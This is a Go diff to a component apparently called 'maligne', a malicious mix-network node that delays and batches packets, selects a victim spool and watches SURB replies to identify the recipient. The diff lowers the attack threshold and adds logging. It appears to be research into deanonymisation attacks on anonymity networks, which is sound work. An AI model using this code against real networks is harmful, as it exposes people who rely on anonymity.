@@ -39,7 +39,7 @@ import (
  * target provider, so we want to execute the attack
  * only when we the success chances are high enough
  */
-const ATTACK_THRESHHOLD = 10
+const ATTACK_THRESHHOLD = 5
 
 /* Defines the moment the attack should be executed,
  * we could also define this only over the
@@ -127,14 +127,15 @@ func (mal *maligne) worker() {
 			if timer_fired() {
 				mal.log.Debugf("Timer has fired!")
 				if len(mal.queue) > ATTACK_THRESHHOLD {
-					mal.log.Debug("Attack Threshold reached!")
+					mal.log.Debugf("Attack Threshold reached! Collected %d packets", len(mal.queue))
 					for _, pkt := range mal.queue {
 						mal.log.Debugf("Sending Pkt: %v", pkt.ID)
 						mal.glue.Scheduler().OnPacket(pkt)
 					}
+					mal.log.Debugf("Mischief Managed")
 					mal.mischiefManaged = true
 				} else {
-					mal.log.Debug("Attack Threshold was not reached!")
+					mal.log.Debugf("Attack Threshold was not reached! Collected only %d of needed %d packets", len(mal.queue), ATTACK_THRESHHOLD)
 					mal.log.Debug("Empty the Queue")
 					mal.queue = []*packet.Packet{}
 				}
@@ -143,9 +144,10 @@ func (mal *maligne) worker() {
 			pkt := e.(*packet.Packet)
 			pkt.Delay = 0
 			mal.queue = append(mal.queue, pkt)
-			mal.log.Debugf("Appended pkt: %v to delay queue", pkt.ID)
+			mal.log.Debugf("Delaying pkt: %v", pkt.ID)
 		case recipient := <-mal.resultCh:
 			mal.log.Debugf("Attack was successful, victim is: %v", recipient)
+			mal.log.Debugf("Mischief Managed")
 			mal.mischiefManaged = true
 		}
 		timer = time.NewTimer(calculate_timer())
@@ -226,33 +228,23 @@ func (mal *maligne) IsVictim(r cborplugin.Request) bool {
 		return false
 	}
 
-	mal.log.Debug("start of handle spool request")
 	spoolID := [common.SpoolIDSize]byte{}
 	copy(spoolID[:], request.SpoolID[:])
 	switch request.Command {
-	case common.CreateSpoolCommand:
-		mal.log.Debug("create spool")
-		mal.log.Debugf("Len of victim is : %d victim is: %v", len(mal.victim), mal.victim)
 
-	case common.PurgeSpoolCommand:
-		return false
 	case common.AppendMessageCommand:
 		if allZero(mal.victim) {
 			copy(mal.victim[:], spoolID[:common.SpoolIDSize])
 			mal.log.Debugf("New victim selected: %v", mal.victim)
 		}
-		mal.log.Debugf("append to spool, with spool ID: %d", request.SpoolID)
 		if spoolID == mal.victim {
-			mal.log.Debugf("Witnessed victim %d", request.SpoolID)
+			mal.log.Debugf("Witnessed victim: %d", request.SpoolID)
 			return true
 		}
-
-	case common.RetrieveMessageCommand:
-		mal.log.Debug("read from spool")
-		mal.log.Debugf("before ReadFromSpool with message ID %d", request.MessageID)
+	default:
 		return false
 	}
-
+	// NOT Reached
 	return false
 }
 
@@ -260,10 +252,9 @@ func (mal *maligne) OnSURBReply(recipient []byte, surbID *[16]byte) {
 	mal.mapMutex.Lock()
 	defer mal.mapMutex.Unlock()
 	wd, ok := mal.watchDogMap[string(recipient)]
-	var wdChannel = wd.InCh
+
 	if ok {
-		mal.log.Debugf("Sent surb %v for %v to worker", surbID, recipient)
-		wdChannel <- *surbID
+		wd.InCh <- *surbID
 	} else {
 		wd, err := NewWatchDog(mal.glue, mal.resultCh, recipient)
 		mal.log.Debugf("Creating new worker for surb %v for %v", surbID, recipient)
